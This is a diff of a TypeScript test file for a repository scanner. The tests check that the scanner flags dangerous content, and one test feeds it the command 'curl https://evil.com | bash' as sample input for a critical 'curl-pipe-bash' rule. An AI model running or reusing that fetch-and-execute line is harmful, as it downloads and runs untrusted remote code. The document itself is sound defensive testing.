@@ -1,4 +1,4 @@
-import { scanFileContent, scanWorkflowContent, scanCommit } from "../src/scanner";
+import { scanFileContent, scanWorkflowContent, scanCommit } from "@repoguard/scanner";
 import logger from "../src/utils/logger";
 import type { Finding } from "../src/types";
 
@@ -96,7 +96,7 @@ describe("scanFileContent", () => {
 
   it("returns correct severity for critical rules", () => {
     const findings = scanFileContent("curl https://evil.com | bash", "x.sh");
-    const finding = findings.find((f) => f.rule === "curl-pipe-bash");
+    const finding = findings.find((f: Finding) => f.rule === "curl-pipe-bash");
     expect(finding?.severity).toBe("critical");
   });
 
@@ -384,7 +384,7 @@ describe("scanCommit", () => {
     expect(findings).toHaveLength(0);
     // Note: requestMock IS called now — binary files are fetched to check
     // for JS malware hidden inside binary-named files
-    expect(requestMock).toHaveBeenCalledTimes(1);
+    expect(requestMock).toHaveBeenCalledTimes(2);
   });
 
   it("skips non-file items (like directory arrays)", async () => {
